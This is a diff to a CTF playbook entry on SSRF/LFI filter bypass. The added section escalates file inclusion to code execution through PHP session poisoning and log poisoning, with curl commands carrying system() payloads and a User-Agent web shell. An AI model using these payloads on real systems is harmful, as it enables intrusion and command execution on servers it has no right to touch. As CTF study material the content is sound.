@@ -1,14 +1,14 @@
 ---
 id: ssrf-lfi-filter-bypass
 category: WEB
-tags: [ssrf, lfi, filtro-de-url, file-wrapper, php-filter, ip-encoding, fuzzing]
+tags: [ssrf, lfi, filtro-de-url, file-wrapper, php-filter, ip-encoding, fuzzing, lfi-to-rce, session-poisoning, log-poisoning, path-traversal, rce]
 tools: []
 manuals: []
 title: "SSRF/LFI: URL-filter bypass fuzzing"
 difficulty: medium
 created: 2026-09-03
-updated: 2026-09-03
-related: []
+updated: 2026-11-23
+related: [xxe-external-entity-file-read, ssti-template-injection, php-object-injection-unserialize-pop-chain]
 ---
 
 ## How to recognize this pattern
@@ -82,6 +82,34 @@ The key logic to preserve: **test in batch, stop at the first hit, follow interm
 response might contain** (some challenges respond with a temporary URL/callback instead of the flag
 directly).
 
+### 4. Escalate a constrained LFI to RCE (when wrappers are filtered)
+
+If `?page=`/`?file=` includes files but `php://`, `data://`, `http:` are blocked, you often can't read
+what you want — but you **can include a file whose content you control**, and PHP will execute any
+`<?php ?>` it finds inside, wherever that file came from.
+
+**Session poisoning (no log path needed):** PHP writes each session to a predictable file. Get a value
+you control stored in the session, then include that session file by path traversal:
+```bash
+B=https://target
+# 1. poison: a param that lands in $_SESSION (here ?note=) carries PHP
+curl -s -c j "$B/?note=%3C%3Fphp+system('cat+/flag.txt+2%3E/dev/null')%3B%3F%3E" >/dev/null
+SID=$(grep -o 'PHPSESSID[[:space:]].*' j | awk '{print $NF}')
+# 2. include the session file via traversal (common paths: /tmp/sess_<SID>, /var/lib/php/sessions/)
+curl -s -b j "$B/?page=../../../tmp/sess_$SID"
+```
+
+**Log poisoning:** put PHP in a logged field (User-Agent is classic), then include the log:
+```bash
+curl -s "$B/" -A "<?php system(\$_GET['c']); ?>"
+curl -s "$B/?page=../../../var/log/apache2/access.log&c=cat+/flag.txt"
+# nginx: /var/log/nginx/access.log ; also /proc/self/environ (via UA), /var/log/auth.log (SSH user)
+```
+
+**`php://filter` RCE** (if the wrapper filter is incomplete): the `convert.base64`/`iconv` chain or the
+`php_filter_chain_generator` can turn a pure read-only LFI into RCE without a writable file. Try it when
+no session/log path is reachable.
+
 ## Gotchas
 
 - Adjust `FLAG_REGEX` to the current CTF's real flag format before running, otherwise grep never
@@ -95,5 +123,9 @@ directly).
 
 ## Related / Cross-reference
 
-If the SSRF target turns out to be a custom service rather than plain HTTP, see `Arsenal/NET/` (to be
-created) for raw-socket interaction.
+- `xxe-external-entity-file-read`: XXE gives the same file-read / SSRF primitives via XML; pair the
+  localhost-bypass list here with an XXE-as-SSRF payload.
+- `php-object-injection-unserialize-pop-chain` / `ssti-template-injection`: alternative routes to RCE
+  once a read primitive isn't enough.
+- If the SSRF target is a custom (non-HTTP) service, see `custom-tcp-service-scripting` /
+  `scapy-packet-crafting` in `Arsenal/NET/` for raw-socket interaction.
